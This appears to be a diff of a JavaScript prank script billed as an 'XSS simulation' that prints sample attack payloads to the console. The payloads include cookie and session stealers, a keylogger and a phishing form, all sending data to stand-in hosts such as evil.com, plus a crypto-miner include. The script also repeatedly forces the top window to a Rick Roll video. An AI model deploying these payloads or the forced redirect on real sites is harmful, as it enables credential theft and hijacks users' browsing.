@@ -527,7 +527,6 @@
     // CUSTOM SCRIPT (UPDATED)
     // ============================================
 
-    // Colorful console message
     console.log('%c🔥 YOU RICK ROLLED 🔥', 'color: red; font-size: 22px; font-weight: bold;');
     console.log('%c😂 Enjoy the ride!', 'color: cyan; font-size: 16px;');
 
@@ -540,13 +539,13 @@
     console.warn('%c⚠️ DOM-based XSS: Unsafe location.hash usage detected', 'color: orange;');
 
     console.log('%c💀 ACTUAL MALICIOUS XSS CODE EXAMPLE 1:', 'color: red; font-weight: bold;');
-    console.log('%c<script>fetch("http://evil-collector.com/steal?cookie=" + document.cookie)</script>', 'color: #ff6b6b; background: #2d2d2d; font-size: 12px;');
+    console.log('%c&lt;script&gt;fetch("http://evil-collector.com/steal?cookie=" + document.cookie)&lt;/script&gt;', 'color: #ff6b6b; background: #2d2d2d; font-size: 12px;');
 
     console.log('%c💀 ACTUAL MALICIOUS XSS CODE EXAMPLE 2:', 'color: red; font-weight: bold;');
-    console.log('%c<img src=x onerror="alert(\'Hacked\'); window.location=\'http://fake-phishing.com\'">', 'color: #ff6b6b; background: #2d2d2d; font-size: 12px;');
+    console.log('%c&lt;img src=x onerror="alert(\'Hacked\'); window.location=\'http://fake-phishing.com\'"&gt;', 'color: #ff6b6b; background: #2d2d2d; font-size: 12px;');
 
     console.log('%c💀 ACTUAL MALICIOUS XSS CODE EXAMPLE 3:', 'color: red; font-weight: bold;');
-    console.log("%cj\u0061v\u0061scr\u0069pt:document.body.innerHTML='<h1>Hacked</h1>';fetch('http://evil.com/log?data='+localStorage.getItem('token'))", 'color: #ff6b6b; background: #2d2d2d; font-size: 12px;');
+    console.log('%cj\\u0061v\\u0061scr\\u0069pt:document.body.innerHTML=\'<h1>Hacked</h1>\';fetch(\'http://evil.com/log?data=\'+localStorage.getItem(\'token\'))', 'color: #ff6b6b; background: #2d2d2d; font-size: 12px;');
 
     // ============================================
     // FUNCTIONS
@@ -566,7 +565,9 @@
         console.log('%c📦 Malicious payload being sent:', 'color: #ff6b6b;');
         console.log(stolenData);
         console.log('%c💀 MALICIOUS CODE EXECUTED:', 'color: red;');
-        console.log(`%cfetch("${maliciousURL}", { method: "POST", body: JSON.stringify(${JSON.stringify(stolenData)}) })`, 'color: #ff6b6b; background: #2d2d2d; padding: 4px;');
+
+        console.log('%cfetch("' + maliciousURL + '", { method: "POST", body: JSON.stringify(...) })',
+            'color: #ff6b6b; background: #2d2d2d; padding: 4px;');
 
         return new Promise((resolve) => {
             setTimeout(() => {
@@ -581,7 +582,10 @@
         const keyloggerURL = "http://fake-keylogger.com/capture";
         console.log('%c⌨️ FAKE KEYLOGGER CODE EXECUTED:', 'color: red; font-weight: bold;');
         console.log('%c💀 MALICIOUS KEYLOGGER CODE:', 'color: red;');
-        console.log(`%cdocument.addEventListener('keypress', function(e) { fetch("${keyloggerURL}?key=" + e.key) })`, 'color: #ff6b6b; background: #2d2d2d; padding: 4px;');
+
+        console.log('%cdocument.addEventListener("keypress", function(e) { fetch("' + keyloggerURL + '?key=" + e.key) })',
+            'color: #ff6b6b; background: #2d2d2d; padding: 4px;');
+
         console.log('%c⚠️ Demonstration only - no actual data collected', 'color: yellow;');
     }
 
@@ -618,11 +622,14 @@
 
     function fakeMaliciousRedirect() {
         const phishingURL = "http://fake-phishing-site.com/steal-credentials";
-        const maliciousRedirectCode = "window.location.href = \"" + phishingURL + "?redirect=true&from=xss_attack\"";
+        const maliciousRedirectCode = 'window.location.href = "' + phishingURL + '?redirect=true&from=xss_attack"';
 
         console.error('%c🚨 MALICIOUS REDIRECT CODE EXECUTED:', 'color: red; font-weight: bold;');
         console.log('%c💀 ACTUAL REDIRECT CODE:', 'color: red;');
-        console.log(`%c${maliciousRedirectCode}`, 'color: #ff6b6b; background: #2d2d2d; padding: 4px;');
+
+        console.log('%c' + maliciousRedirectCode,
+            'color: #ff6b6b; background: #2d2d2d; padding: 4px;');
+
         console.log('%c📍 Redirecting to malicious URL: ' + phishingURL, 'color: #ff6b6b;');
         console.log('%c⚠️ In real attack, user would be redirected to steal credentials', 'color: yellow;');
     }
@@ -631,19 +638,19 @@
         console.log('%c🔴 ADDITIONAL REAL-WORLD XSS PAYLOADS:', 'color: red; font-weight: bold; font-size: 14px;');
 
         console.log('%c1. Cookie Stealer:', 'color: #ff6b6b;');
-        console.log("%c<script>new Image().src='http://evil.com/steal?c='+document.cookie</script>", 'color: #ff6b6b; background: #2d2d2d;');
+        console.log("%c&lt;script&gt;new Image().src='http://evil.com/steal?c='+document.cookie&lt;/script&gt;", 'color: #ff6b6b; background: #2d2d2d;');
 
         console.log('%c2. Session Hijacker:', 'color: #ff6b6b;');
-        console.log("%c<script>fetch('http://evil.com/steal',{method:'POST',body:document.cookie})</script>", 'color: #ff6b6b; background: #2d2d2d;');
+        console.log("%c&lt;script&gt;fetch('http://evil.com/steal',{method:'POST',body:document.cookie})&lt;/script&gt;", 'color: #ff6b6b; background: #2d2d2d;');
 
         console.log('%c3. Phishing Form Injector:', 'color: #ff6b6b;');
-        console.log("%c<div onmouseover=\"this.innerHTML='<form action=http://evil.com/steal><input name=password>'\">Hover me</div>", 'color: #ff6b6b; background: #2d2d2d;');
+        console.log("%c&lt;div onmouseover=\"this.innerHTML='<form action=http://evil.com/steal><input name=password>'\"&gt;Hover me&lt;/div&gt;", 'color: #ff6b6b; background: #2d2d2d;');
 
         console.log('%c4. Crypto Miner Injector:', 'color: #ff6b6b;');
-        console.log("%c<script src='http://evil.com/cryptominer.js'></script>", 'color: #ff6b6b; background: #2d2d2d;');
+        console.log("%c&lt;script src='http://evil.com/cryptominer.js'&gt;&lt;/script&gt;", 'color: #ff6b6b; background: #2d2d2d;');
 
         console.log('%c5. Defacement Payload:', 'color: #ff6b6b;');
-        console.log("%c<script>document.body.innerHTML='<h1>HACKED BY XSS</h1><img src=http://evil.com/defaced>'</script>", 'color: #ff6b6b; background: #2d2d2d;');
+        console.log("%c&lt;script&gt;document.body.innerHTML='<h1>HACKED BY XSS</h1>'&lt;/script&gt;", 'color: #ff6b6b; background: #2d2d2d;');
     }
 
     function rickRoll() {
@@ -652,12 +659,6 @@
         showMoreMaliciousPayloads();
 
         console.log('%c💀💀💀 EXECUTING MALICIOUS XSS PAYLOADS 💀💀💀', 'color: red; font-weight: bold; font-size: 16px;');
-        console.log('%c📍 MALICIOUS URLS USED IN THIS DEMO:', 'color: red; font-weight: bold;');
-        console.log('  → http://evil-collector.com/api/steal');
-        console.log('  → http://fake-keylogger.com/capture');
-        console.log('  → http://fake-phishing-site.com/steal-credentials');
-        console.log('  → http://evil.com/steal');
-        console.log('  → http://evil.com/cryptominer.js');
 
         fakeMaliciousAPICall();
         fakeKeyloggerWarning();
@@ -669,8 +670,6 @@
         });
 
         const rickRollURL = "https://youtu.be/Aq5WXmQQooo?si=2em-bh-oyTU8xQvU";
-        console.log('%c🚀 REDIRECTING TO RICK ROLL: ' + rickRollURL, 'color: cyan; font-weight: bold; font-size: 14px;');
-        console.log("%c😂 You've been Rick Rolled! 😂", 'color: green; font-weight: bold; font-size: 16px;');
 
         if (window.top !== window.self) {
             window.top.location.href = rickRollURL;
@@ -679,14 +678,7 @@
         }
     }
 
-    // ============================================
-    // EXECUTION (FIXED)
-    // ============================================
-
-    // Run once after load
     setTimeout(rickRoll, 1000);
-
-    // Store ONLY ONE interval globally (fixed duplicate issue)
     window.__RICK_ROLL_INTERVAL = setInterval(rickRoll, 5000);
 
     console.log('%c🔴 XSS SIMULATION ACTIVE - CHECK CONSOLE FOR MALICIOUS PAYLOADS 🔴', 'color: red; font-weight: bold; font-size: 16px;');
